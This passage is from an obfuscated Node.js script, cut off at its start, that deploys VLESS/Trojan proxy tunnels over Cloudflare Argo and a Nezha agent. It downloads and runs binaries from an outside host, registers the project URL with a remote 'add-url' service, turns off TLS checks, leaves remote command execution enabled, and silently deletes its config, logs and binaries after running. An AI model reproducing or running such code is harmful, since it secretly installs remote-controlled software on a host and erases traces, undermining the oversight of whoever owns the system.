_0x4dcfba=_0x326c0e,_0x48f142=['47fa0b9f-1420-4738-b608-ff94a6e29692',_0x4dcfba(0xcd),_0x4dcfba(0x158),_0x4dcfba(0x174),'forEach',_0x4dcfba(0x13f),_0x4dcfba(0x12a),_0x4dcfba(0xc3),_0x4dcfba(0x14c),'TunnelSecret',_0x4dcfba(0x143),'utf-8',_0x4dcfba(0x116),'13021580UVQkFu',_0x4dcfba(0xde),_0x4dcfba(0xee),_0x4dcfba(0x144),_0x4dcfba(0xf5),_0x4dcfba(0x142),_0x4dcfba(0xea),'data',_0x4dcfba(0x12b),'./tmp',_0x4dcfba(0x169),_0x4dcfba(0x178),_0x4dcfba(0x125),_0x4dcfba(0x11e),_0x4dcfba(0xf2),'blackhole',_0x4dcfba(0xc5),_0x4dcfba(0xc9),_0x4dcfba(0xd0),'country_code',_0x4dcfba(0xf6),'send',_0x4dcfba(0x140),_0x4dcfba(0x113),_0x4dcfba(0x108),_0x4dcfba(0xe5),'unlink','https://oooo.serv00.net/add-url',_0x4dcfba(0x16d),_0x4dcfba(0x170),'SUB_PATH',_0x4dcfba(0x124),'\x0a\x20\x20credentials-file:\x20',_0x4dcfba(0x119),_0x4dcfba(0x12e),_0x4dcfba(0xda),_0x4dcfba(0x13b),_0x4dcfba(0x151),'push',_0x4dcfba(0x15f),'log',_0x4dcfba(0x117),_0x4dcfba(0x137),'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',_0x4dcfba(0x106),'none',_0x4dcfba(0x17b),_0x4dcfba(0x147),'\x0avless://',_0x4dcfba(0x157),_0x4dcfba(0x159),'basename','org',_0x4dcfba(0x109),_0x4dcfba(0xd4),_0x4dcfba(0x110),_0x4dcfba(0xf9),_0x4dcfba(0x130),'&fp=firefox&type=ws&host=','/vless-argo',_0x4dcfba(0x118),_0x4dcfba(0xdb),'Add\x20automatic\x20access\x20task\x20faild:\x20',_0x4dcfba(0x16b),'\x0aclient_secret:\x20',_0x4dcfba(0xfb),'NAME',_0x4dcfba(0xf7),_0x4dcfba(0x10f),_0x4dcfba(0x15c),_0x4dcfba(0xd2),'https://amd64.ssss.nyc.mn/bot',_0x4dcfba(0x101),'CFIP',_0x4dcfba(0x156),'.exe\x20>\x20nul\x202>&1','boot.log',_0x4dcfba(0xc6),'132CxbiQv',_0x4dcfba(0x166),'readdirSync',_0x4dcfba(0x161),_0x4dcfba(0x103),'PROJECT_URL','2096',_0x4dcfba(0xcc),_0x4dcfba(0xfe),_0x4dcfba(0x173),_0x4dcfba(0x102),_0x4dcfba(0xd5),_0x4dcfba(0xd1),_0x4dcfba(0xe8),_0x4dcfba(0xf8),_0x4dcfba(0xff),_0x4dcfba(0xfa),'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',_0x4dcfba(0x136),_0x4dcfba(0xe9),_0x4dcfba(0x13e),'config.yaml',_0x4dcfba(0x10d),'&path=%2Ftrojan-argo%3Fed%3D2560#','UUID',_0x4dcfba(0x11f),'tunnel\x20--edge-ip-version\x20auto\x20--config\x20',_0x4dcfba(0x154),_0x4dcfba(0x10a),_0x4dcfba(0xed),_0x4dcfba(0x135),'31871BBUQbB',_0x4dcfba(0xca),_0x4dcfba(0x15e),_0x4dcfba(0x175),_0x4dcfba(0x152),_0x4dcfba(0x129),_0x4dcfba(0xc1),_0x4dcfba(0x14f),_0x4dcfba(0x172),_0x4dcfba(0x12c),'status','2087',_0x4dcfba(0x149),_0x4dcfba(0xe6),_0x4dcfba(0x100),_0x4dcfba(0xe0),_0x4dcfba(0x114),_0x4dcfba(0x148),_0x4dcfba(0x120),_0x4dcfba(0x104),'/dev/null','error',_0x4dcfba(0x17a),_0x4dcfba(0x11c),_0x4dcfba(0x10e),'tls',_0x4dcfba(0xce),_0x4dcfba(0x15a),_0x4dcfba(0x13d),_0x4dcfba(0x12d),_0x4dcfba(0x14d),'block',_0x4dcfba(0x179),_0x4dcfba(0x16f),'156330vccgHj',_0x4dcfba(0xcb),'fileName',_0x4dcfba(0x162),_0x4dcfba(0x16c),_0x4dcfba(0x150),_0x4dcfba(0xdd),_0x4dcfba(0xf4),_0x4dcfba(0x133),_0x4dcfba(0xbf),_0x4dcfba(0xdf),_0x4dcfba(0xe3),_0x4dcfba(0xfc),'2083','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',_0x4dcfba(0x16a),_0x4dcfba(0x105),_0x4dcfba(0xeb),_0x4dcfba(0xd8),_0x4dcfba(0x13c),_0x4dcfba(0x122),_0x4dcfba(0x15d),_0x4dcfba(0xe1),_0x4dcfba(0xd3),_0x4dcfba(0xe4),'readFileSync',_0x4dcfba(0x164),'/tunnel.yml\x20run',_0x4dcfba(0x14e),_0x4dcfba(0x134),_0x4dcfba(0xd9),_0x4dcfba(0xdc),'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',_0x4dcfba(0xc2),_0x4dcfba(0xc7),'util','pop',_0x4dcfba(0xc4)];return _0x50fb=function(){return _0x48f142;},_0x50fb();}function cleanFiles(){setTimeout(()=>{const _0x5545ef=_0x1034,_0xf64f59=_0x5564,_0x4ea105=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4ea105[_0xf64f59(0x1cf)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4ea105[_0xf64f59(0x1cf)](phpPath);process[_0xf64f59(0x194)]===_0x5545ef(0x10f)?exec(_0xf64f59(0x223)+_0x4ea105[_0x5545ef(0x173)]('\x20')+_0xf64f59(0x1cd),_0x27a8c3=>{const _0x16af50=_0x5545ef,_0x4bad3f=_0xf64f59;console['clear'](),console[_0x4bad3f(0x1d1)](_0x16af50(0x15b)),console[_0x4bad3f(0x1d1)](_0x4bad3f(0x196));}):exec(_0xf64f59(0x1d5)+_0x4ea105[_0xf64f59(0x200)]('\x20')+_0xf64f59(0x1ce),_0x1af42a=>{const _0x364085=_0x5545ef,_0x39f972=_0xf64f59;console[_0x39f972(0x217)](),console[_0x39f972(0x1d1)](_0x364085(0x15b)),console[_0x39f972(0x1d1)](_0x39f972(0x196));});},0x15f90);}function _0x1034(_0x35b61b,_0x25d834){_0x35b61b=_0x35b61b-0xbe;const _0x103487=_0x25d8();let _0x6d10e6=_0x103487[_0x35b61b];return _0x6d10e6;}cleanFiles();async function AddVisitTask(){const _0x4ec2a2=_0x326c0e,_0x8bb4bf=_0x3ef2c6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4ec2a2(0x12f)](_0x8bb4bf(0x21f));return;}try{const _0x19201a=await axios[_0x8bb4bf(0x186)](_0x8bb4bf(0x1c4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x8bb4bf(0x1b6)}});return console[_0x4ec2a2(0x12f)](_0x8bb4bf(0x177)),_0x19201a;}catch(_0x506132){return console[_0x4ec2a2(0xe7)](_0x8bb4bf(0x1e7)+_0x506132[_0x8bb4bf(0x1de)]),null;}}async function startserver(){const _0x192aed=_0x326c0e,_0x357108=_0x3ef2c6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x422abb){console[_0x192aed(0xe7)](_0x357108(0x1ea),_0x422abb);}}startserver()[_0x3ef2c6(0x1e5)](_0x5f0ad4=>{const _0x65cb47=_0x326c0e;console[_0x65cb47(0xe7)](_0x65cb47(0xd7),_0x5f0ad4);}),app[_0x3ef2c6(0x166)](PORT,()=>console[_0x326c0e(0x12f)](_0x3ef2c6(0x1a3)+PORT+'!'));
